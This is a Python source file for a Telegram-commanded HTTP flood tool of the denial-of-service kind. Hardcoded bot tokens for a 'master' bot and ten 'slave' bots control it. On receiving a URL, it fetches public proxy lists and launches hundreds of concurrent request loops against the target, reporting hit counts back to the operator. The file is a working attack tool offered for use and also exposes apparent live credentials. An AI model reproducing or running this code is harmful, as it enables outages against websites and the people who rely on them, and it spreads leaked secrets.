import asyncio
import aiohttp
import random
from aiohttp import web

MASTER_TOKEN = "8536346083:AAGYUDR6cd7hI9_41_gNbQdREbBb6Dn_9v4"
SLAVE_ARMY = {
    "S1": "8064983761:AAGEZRc9LASS7Fkifm3C3ebOdykCTTJUZ_0", "S2": "8460123410:AAE61k-8wPWE4hkmOxge802d8k7CTrhcfCE",
    "S3": "8529444938:AAHd0VxfMeMlA3XSu9NH5RiBcUvRW09atgE", "S4": "8500850898:AAEje_m--Tt7eOYjKWwpxXC_BYl2NhiqgVc",
    "S5": "8497321044:AAGGQ2eng3ZgtjOECMRyHO_OJjvSuLTH9RI", "S6": "8201736485:AAGFSv-af1506M9pipoaFbHKQW2vLloIMFk",
    "S7": "8420555273:AAHD4mJVw1wY0_nQVSenIBNEaAomcH98sXo", "S8": "8524480261:AAGCe54hX-9PjDsVQW5whE36kj5IBNmKRKA",
    "S9": "8579851332:AAGSd7Mtze2XfBlFoQWcIL5JrzBiz47qXAI", "S10": "8525114674:AAE7LnGxkqaaL6M0DH25NiU3WYHygWYlON4"
}
MASTER_ID = 1938591484

class AIP2K_Display_Engine:
    def __init__(self):
        self.targets = {}
        self.session = None
        self.stats = {name: {"hits": 0, "errors": 0} for name in SLAVE_ARMY}
        self.total_target_hits = 0

    async def _notify(self, text):
        url = f"https://api.telegram.org/bot{MASTER_TOKEN}/sendMessage"
        print(f"🖥️ [DASHBOARD]: {text}")
        try:
            async with self.session.post(url, json={'chat_id': MASTER_ID, 'text': text, 'parse_mode': 'Markdown'}) as r: pass
        except: pass

    async def _get_auto_proxies(self):
        urls = [
            "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",
            "https://www.proxy-list.download/api/v1/get?type=http"
        ]
        proxies = []
        for url in urls:
            try:
                async with self.session.get(url, timeout=10) as r:
                    if r.status == 200: proxies.extend((await r.text()).splitlines())
            except: pass
        return list(set(proxies))

    async def _soldier_task(self, name, token, target, proxies):
        while target in self.targets:
            proxy = random.choice(proxies) if proxies else None
            h = {'User-Agent': f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebkit/537.36 (KHTML, like Gecko) Chrome/{random.randint(110,126)}.0.0.0 Safari/537.36"}
            try:
                async with self.session.get(target, headers=h, proxy=f"http://{proxy}" if proxy else None, timeout=7) as r:
                    if r.status == 200:
                        self.stats[name]["hits"] += 1
                        self.total_target_hits += 1
                    else: self.stats[name]["errors"] += 1
            except: self.stats[name]["errors"] += 1
            
            # প্রতি ১০০০ হিট পর পর মাস্টারকে রিপোর্ট দিবে
            if self.total_target_hits % 1000 == 0:
                await self._display_update()
            await asyncio.sleep(0.00001)

    async def _display_update(self):
        report = "📊 **AIP2K REAL-TIME MONITOR**\n"
        report += f"🎯 Target Hits: `{self.total_target_hits}`\n"
        report += "----------------------------\n"
        for name, data in self.stats.items():
            report += f"🤖 {name}: ✅ `{data['hits']}` | ❌ `{data['errors']}`\n"
        await self._notify(report)

    async def handle_updates(self):
        offset = 0
        await self._notify("🔱 **AIP2K MASTER SYSTEM ONLINE**\n১০টি সোলজার ইঞ্জিন প্রস্তুত।")
        while True:
            try:
                url = f"https://api.telegram.org/bot{MASTER_TOKEN}/getUpdates?offset={offset}&timeout=30"
                async with self.session.get(url) as r:
                    data = await r.json()
                    for update in data.get('result', []):
                        offset = update['update_id'] + 1
                        msg = update.get('message', {})
                        text, uid = msg.get('text', ''), msg.get('from', {}).get('id', 0)
                        if uid != MASTER_ID: continue
                        
                        if text.startswith("http"):
                            self.targets[text] = True
                            self.total_target_hits = 0
                            p_list = await self._get_auto_proxies()
                            await self._notify(f"⚔️ **LAUNCHING FULL OVERLOAD**\nTarget: {text}\nProxies Loaded: {len(p_list)}")
                            for name, token in SLAVE_ARMY.items():
                                for _ in range(80): # প্রতিটি বটের জন্য ৮০টি করে প্যারালাল থ্রেড
                                    asyncio.create_task(self._soldier_task(name, token, text, p_list))
                        
                        elif text == "/status":
                            await self._display_update()
                        
                        elif text == "/stop":
                            self.targets.clear()
                            await self._notify("🛑 **SYSTEM HALTED. FINAL STATS SENT.**")
            except: await asyncio.sleep(1)

async def main():
    core = AIP2K_Display_Engine()
    async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(limit=0)) as sess:
        core.session = sess
        app = web.Application()
        app.router.add_get('/', lambda r: web.Response(text="AIP2K_DASHBOARD_ACTIVE"))
        runner = web.AppRunner(app)
        await runner.setup()
        await web.TCPSite(runner, '0.0.0.0', 10000).start()
        await core.handle_updates()

if __name__ == "__main__":
    asyncio.run(main())
    
